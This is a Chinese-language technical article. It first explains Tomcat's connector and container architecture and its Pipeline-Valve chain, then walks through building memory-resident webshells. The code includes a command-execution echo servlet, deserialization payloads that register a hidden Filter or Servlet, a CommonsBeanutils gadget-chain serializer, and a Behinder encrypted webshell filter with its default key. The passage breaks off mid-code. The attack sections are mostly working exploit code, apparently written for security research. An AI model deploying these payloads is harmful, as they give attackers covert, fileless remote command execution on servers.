多个连接器对应一个容器，顶层容器其实就是Engine； 每个组件都有对应的生命周期，需要启动的话，还需要启动自己内部的子组件，比如一个Tomcat实例包含一个Service，一个Service包含多个连接器和一个容器。而一个容器又包含多个Host，Host内部可能有多个Context容器，而一个Context也会包含多个Servlet。整体是一个俄罗斯套娃。 Connecter(连接器) Tomcat支持的IO模型有： NIO：非阻塞IO，采用Java NIO类库实现； NIO2：异步IO，采用JDK7最新的的NIO2类库实现； APR：采用Apache可移植运行库实现，是C/C++编写的本地库； Tomcat支持的应用层协议有： HTTP/1.1：绝大部分WEB应用采用的访问协议； AJP：用于和WEB服务器集成； HTTP/2：HTTP 2.0大幅度提升了WEB性能； 所以一个容器可能对接多个连接器，连接器对Servlet容器屏蔽了网络协议和IO模型，无论是HTTP还是AJP协议，在容器中获取到的都是一个标准的ServletRequest对象。 细化连接器的功能就是： 监听网络端口； 接收网络连接请求； 读取请求网络字节流； 根据具体的应用层协议解析字节流，生成统一的Tomcat Request对象； 将Tomcat Request对象转换成标准的ServletRequest对象； 调用Servlet容器，得到ServletResponse对象； 将ServletResponse转成Tomcat Response对象； 将Tomcat Response转成网络字节流； 将响应字节流写回给浏览器； 其中，Tomcat设计了三个组件，其负责功能如下： EndPoint：负责网络通信，将字节流传递给Processor； Processor：负责处理字节流生成Tomcat Request对象，将Tomcat Request对象传递给Adapter； Adapter：负责将Tomcat Request对象转成ServletRequest对象，传递给容器； 再细化一下连接器，得到如下架构图： ProtocolHandler组件 Endpoint和Processor放在一起抽象成了ProtocolHandler组件，主要负责处理： 网络连接和应层协议 。 Endpoint组件 Endpoint是通信端点，是具体的Socket接收和发送处理器，是对传输层的抽象。因此Endpoint是用TCP/IP协议来进行数据读写的，本质是调用Socket接口； 简而言之，Endpoint接收到Socket连接后，生成一个SocketProcessor任务提交到线程池进行处理，SocketProcessor的run方法将调用Processor组件进行应用层协议的解析，Processor解析后生成Tomcat Request对象，然后会调用Adapter的Service方法，方法内部通过如下代码将Request请求传递到容器中： // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke(request, response); Adapter组件 由于协议的不同，Tomcat定义了自己的Request类来存放请求信息，但是这个不是标准的ServletRequest。于是需要使用Adapter将Tomcat Request对象转成ServletRequest对象，然后就可以调用容器的service方法了； Container(容器) Connector连接器负责外部交流，Container容器负责内部处理。也就是： 连接器处理Socket通信和应用层协议的解析，得到ServletRequest，而容器则负责处理ServletRequest。 容器顾名思义，就是用来装东西的，Tomcat容器就是用来装载Servlet的； Tomcat设计了4种容器：Engine、Host、Context和Wrapper。这四种容器是父子关系，如下图所示： 一个Host多个Context，一个Context包含多个Servlet； Wrapper表示一个Servlet，Context表示一个WEB应用程序，而一个WEB应用可以有多个Servlet； Host表示一个虚拟机，或者说一个站点，一个Tomcat可以配置多个站点； 一个站点可以部署多个WEB应用； Engine代表引擎，用于管理多个站点（Host），一个Service只能有一个Engine； 下面是Tomcat的配置文件，可以反应这些层次关系： // 顶层组件，可包含多个 Service，代表一个 Tomcat 实例 // 顶层组件，包含一个 Engine ，多个连接器 // 连接器 // 容器组件：一个 Engine 处理 Service 所有请求，包含多个 Host // 容器组件：处理指定Host下的客户端请求， 可包含多个 Context // 容器组件：处理特定 Context Web应用的所有客户端请求 请求定位Servlet的过程 Tomcat使用Mapper组件来完成请求到Wrapper中Servlet的定位的；Mapper组件的功能就是将用户请求的URL定位到一个Servlet，它的工作原理是： Mapper组件里保存了WEB应用的配置信息，也就是容器组件与访问路径的映射关系 。比如Host容器里配置的域名、Context容器里的WEB应用路径以及Wrapper容器里Servlet映射的路径。这是一个多层次的Map； 当一个请求过来，Mapper组件通过解析请求URL里的域名和路径，再到自己保存的Map里去找，就能定位到一个Servlet。 最终，一个请求URL只会定位到一个Wrapper容器，也就是一个Servlet 。 连接器中的Adapter会调用容器的service方法来执行Servlet，最先拿到请求的是Engine容器，Engine容器对请求做一些处理后，会把请求传给自己的子容器Host继续处理，以此类推，最终这个请求会传给Wrapper容器，Wrapper容器会调用最终的Servlet来处理。 整个调用过程是通过Pipeline-Valve管道进行的 。 Pipeline-Valve是责任链模式，责任链模式是指：在一个请求处理的过程中，有很多处理者一次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后再调用下一个处理者继续处理 。Valve表示一个处理点（也就是一个处理阀门），Valve中的invoke方法就是来处理请求的。 Valve的数据结构如下： public interface Valve { public Valve getNext(); public void setNext(Valve valve); public void invoke(Request request, Response response) } Pipeline的数据结构如下： public interface Pipeline { public void addValve(Valve valve); public Valve getBasic(); public void setBasic(Valve valve); public Valve getFirst(); } Pipeline中有addValve方法，维护了Valve链表，Valve可以插入到Pipeline中，对请求做某些处理。Pipeline中是没有invoke方法的，因为整个调用链的触发是Valve来完成的，Valve完成自己的处理后，调用getNext().invoke()来触发下一个Valve调用。 每个容器都有一个Pipeline对象，只要触发了这个Pipeline的第一个Valve，这个容器里的Pipeline中的Valve都会被调用到。 其中，Pipeline中的getBasic方法获取的Valve处于Valve链的末端，它是Pipeline中必不可少的一个Valve， 负责调用下层容器的Pipeline里的第一个Valve 。 演示图如下图所示： 而整个过程是通过连接器CoyoteAdapter中的service方法触发的，它会调用Engine的第一个Valve，如下所示： @Override public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) { // 省略其他代码 // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke( request, response); ... } Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。 Tomcat类加载器 Tomcat自定义的类加载器WebAppClassloader为了隔离WEB应用打破了双亲委托机制，它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载WEB应用自己定义的类。 同时，为了防止WEB应用自己的类覆盖JRE的核心类，在本地WEB应用目录下查找之前，先使用ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类； 总结 最终得到总体的请求流程图，如下图所示： Tomcat 回显 该部分大部分来自于threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 环境 jdk jdk8u181 tomcat tomcat8.5.79 首先可以看看一个普通http请求进来的时候，tomcat的部分执行栈： doGet:27, HelloServlet (com.fastjson.test) service:655, HttpServlet (javax.servlet.http) service:764, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) [2] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) [1] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:197, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:543, AuthenticatorBase (org.apache.catalina.authenticator) invoke:135, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:367, CoyoteAdapter (org.apache.catalina.connector) service:639, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:882, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1647, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 按照kingkk师傅的方法，利用的点是在 org.apache.catalina.core.ApplicationFilterChain.internalDoFilter： 其中通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，执行完了所有的Filter了**filter.doFilter(request, response, this)**,这个致命的缺点就会导致shiro无法获取到response回显，因为shiro本身就是一个filter private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if (this.pos 动态注册Filter 通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了，要实现动态动态注册filter，第一个步骤就是要获取到request和response，第二步则是通过request或者response去创建filter 在这里需要知道ApplicationDispather.WRAP_SAME_OBJECT这个变量为false，且lastServiceRequest初始化都为null，如果能将其request,response都set进去，那么则可以直接获取到request，在这里就需要通过反射将ApplicationDispather.WRAP_SAME_OBJECT设置为true使其走到对应的条件语句中来 这样当我们第二次访问的时候将 response 从 lastServicedResponse 中取出来，然后将我们命令执行的结果直接写在 response 里面就可以了 在这里我们先使用一个servlet来本地尝试一下： 第一次访问利用反射修改特定参数，从而将 request 和 response 存储到 lastServicedRequest 和 lastServicedResponse 中 第二次访问将我们需要的 request 和 response 取出，从而将结果写入 response 中从而达到回显目的 创建一个Servlet，在web.xml里声明name，和path package com.fastjson.test; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.io.Writer; import java.lang.reflect.Field; import java.lang.reflect.Modifier; @WebServlet(\"/echo\") @SuppressWarnings(\"all\") public class ShellServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try{ Class applicationDispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\"); WRAP_SAME_OBJECT_FIELD.setAccessible(true); // 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性 Field f0 = Class.forName(\"java.lang.reflect.Field\").getDeclaredField(\"modifiers\"); f0.setAccessible(true); f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL); Class applicationFilterChain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); Field lastServicedRequestField = applicationFilterChain.getDeclaredField(\"lastServicedRequest\"); Field lastServicedResponseField = applicationFilterChain.getDeclaredField(\"lastServicedResponse\"); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL); f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL); ThreadLocal lastServicedRequest = (ThreadLocal) lastServicedRequestField.get(applicationFilterChain); ThreadLocal lastServicedResponse = (ThreadLocal) lastServicedResponseField.get(applicationFilterChain); String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter(\"cmd\"):null; if (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == null || lastServicedResponse == null){ WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true); lastServicedRequestField.set(applicationFilterChain,new ThreadLocal()); lastServicedResponseField.set(applicationFilterChain,new ThreadLocal()); } else if (cmd!=null){ InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); StringBuilder sb = new StringBuilder(\"\"); byte[] bytes = new byte[1024]; int line = 0; while ((line = inputStream.read(bytes))!=-1){ sb.append(new String(bytes,0,line)); } Writer writer = lastServicedResponse.get().getWriter(); writer.write(sb.toString()); writer.flush(); } }catch (Exception e){ e.printStackTrace(); } } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 首先在访问/echo的时候，第一次访问ApplicationDispatcher.WRAP_SAME_OBJECT这里为false 在这里就会直接把resquest和response 给对应访问的servlet（ShellServlet）然后可以看到 然后到ShellServlet#doGet()的时候，则会进入到if分支因为当前的ApplicationDispather.WRAP_SAME_OBJECT为false，且lastServicedRequest,lastServicedResponse初始化都为null，通过反射将ApplicationDispather.WRAP_SAME_OBJECT这个变量修改为true，并将lastServicedRequest,lastServicedResponse初始化实例化 由于修改值之后，最后到finally，lastServicedRequest，lastServicedResponse又会被设置为(Object) null 然后第二次访问的时候，此时ApplicationDispather.WRAP_SAME_OBJECT为true，进入条件分支，此时lastServicedRequest，lastServicedResponse都已经被赋值 然后到我们的Servlet当中来可以看到，传入的参数cmd被获取到，直接就会执行Runtime.getRuntime().exec() 最后再通过response回显到页面中 反序列化注入Filter 在进行反序列化注入之前，这里使用之前写的Commons Collections 系列靶场 这里主要需要执行两步： 第一步将 request 和 response 存入到 lastServicedRequest 和 lastServicedResponse 中 第二步从 lastServicedRequest 和 lastServicedResponse 获取到我们的 request 和 response ，然后利用 request 获取到 servletcontext 然后动态注册 Filter 存入request和response 第一步还是和上面一样需要存入request 和 response 到 lastServicedRequest 和 lastServicedResponse，在这里写一个TomcatEcho类需要继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）在其静态代码块中反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化 这里贴一下threedr3am师傅的代码 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 当第一步通过反序列化完成之后，那么WRAP_SAME_OBJECT 值为 true，lastServicedRequest和lastServicedResponse这两个ThreadLocal也都初始化了，那么就能够获取到request，就能获取ServletContext，进而获取到StandardContext 代码如下： package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.LifecycleState; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; /** * @author threedr3am */ public class TomcatInject extends AbstractTranslet implements Filter { /** * webshell命令参数名 */ private final String cmdParamName = \"cmd\"; private final static String filterUrlPattern = \"/*\"; private final static String filterName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null){ Field ctx = servletContext.getClass().getDeclaredField(\"context\"); ctx.setAccessible(true); ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext); Field stdctx = appctx.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(appctx); if (standardContext != null){ // 这样设置不会抛出报错 Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, LifecycleState.STARTING_PREP); Filter myFilter =new TomcatInject(); // 调用 doFilter 来动态添加我们的 Filter // 这里也可以利用反射来添加我们的 Filter javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName,myFilter); // 进行一些简单的设置 filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // 设置基本的 url pattern filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); // 将服务重新修改回来，不然的话服务会无法正常进行 if (stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // 在设置之后我们需要 调用 filterstart if (standardContext != null){ // 设置filter之后调用 filterstart 来启动我们的 filter Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); /** * 将我们的 filtermap 插入到最前面 */ Class ccc = null; try { ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\"); } catch (Throwable t){} } //把filter插到第一位 Method m = Class.forName(\"org.apache.catalina.core.StandardContext\") .getDeclaredMethod(\"findFilterMaps\"); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i 简单分析 首先将第一步中存入的 request 进行取出 在下面这个静态方法中就是获取对应的ServletContext，当然需要配合第一步的已经修改WRAP_SAME_OBJECT 值为 true 在利用取出的 request 获取到 servletContext 后，就会调用 addFilter 来动态添加 然后在doFilter()函数里完成逻辑就行 测试 在这里使用Y4er——ysoserial大哥修改过的ysoserial，在其中我提取ClassLoaderTemplate，在项目中加入该jar包 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 然后我们编写序列化代码，这里我直接使用CB1链，分别将TomcatEcho.class，TomcatInject.class序列化成TomcatEcho.ser，TomcatInject.ser package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.*; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_3 { public Test_3() { } public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatEcho.class\")); // byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatInject.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates, \"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates, targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates, null); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f3 = comparator.getClass().getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"queue\"); f4.setAccessible(true); Object[] queueArray = (Object[]) f4.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"tomcatEcho.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } } 然后对应将TomcatEcho.ser，TomcatInject.ser 通过Base64编码一下 然后再分别发送至服务器（在参数里切记一定要url编码一次） 然后在web根路径下，带入参数cmd，并执行命令，如下所示 注入冰蝎马 注入冰蝎马这里需要注意，虽然只是修改filter逻辑，在doFilter()编写冰蝎马逻辑 首先查看Behinder_v3.0_Beta_9中的shell.jsp代码 冰蝎自定义了一个可以解析class字节数组的类加载器U，逻辑为，使用g方法调用super.defineClass，可以将byte[]直接转换为Class对象 class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } 判断为post请求后，读取请求体中的数据，拿到进行Base64+AES解码后的字节码数据。 if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); new U(this.getClass().getClassLoader()).g( c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))) .newInstance().equals(pageContext); } request和session对象 request对象可以通过其doFilter方法参数中传递的ServletRequest获得，而session可以通过request.getSession()获得 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); pageContext对象 pageContext对象为jsp九大内置对象，在冰蝎作者rebeyond的文章利用动态二进制加密实现新型一句话木马之Java篇中知道，在冰蝎的代码中，服务端需要从pageContext对象中获取出request/response/session。 而在冰蝎3.0 bata7之后不再依赖pageContext对象，只需给在equal函数中传递的object对象中，有request/response/session对象即可，所以此时我们可以把pageContext对象换成一个Map，手动添加这三个对象即可 HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); 如果如下图所示，在TomcatInject.java里再写一个类U来继承ClassLoader，在编译之后会生成两个Class文件，导致无法调用class U中的方法 因为我们不能实例化自己的类加载器，所以我们就使用反射的方法，调用ClassLoader，不过这里也有一个坑点，就是抽象类，是不可以作为invoke()的第一个参数，所以要使用一个他的继承类作为替代品，代码如下 //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); 最后doFilter中注入冰蝎马如下所示 // doFilter逻辑 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { try { System.out.println(\"Do Filter ......\"); // 获取request和response对象 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); //create pageContext HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); } }catch (Exception e){ e.printStackTrace(); } filterChain.doFilter(servletRequest, servletResponse); System.out.println(\"doFilter\"); } 编译生成对应的TomcatEcho.class,TomcatInject.class，然后通过序列化生成对应的TomcatEcho.ser,TomcatInject.ser,最后通过反序列化漏洞直接在目标web系统中反序列化最后成功注入冰蝎马 反序列化注入Servlet 在Tomcat基础内存马入门中，Tomcat注入内存马中除了注入Filter，还可以注入Servlet 其中基本思路不变，只是需要获取request，然后从request中获取ServletContext，然后依次获取ApplicationContext、StandardContext，最后将servlet封装成wrapper再使用context添加ServletMapping，就可以了 注入普通马 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 在这里需要注意的是，TomcatInjectServlet 需要实现Servlet接口，和Filter一样，因为需要被TemplatesImpl类来加载，所以需要继承AbstractTranslet类 package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; public class TomcatInjectServlet extends AbstractTranslet implements Servlet { /** * webshell命令参数名 */ private final static String servletUrlPattern = \"/*\"; private final static String servletName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null) { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new 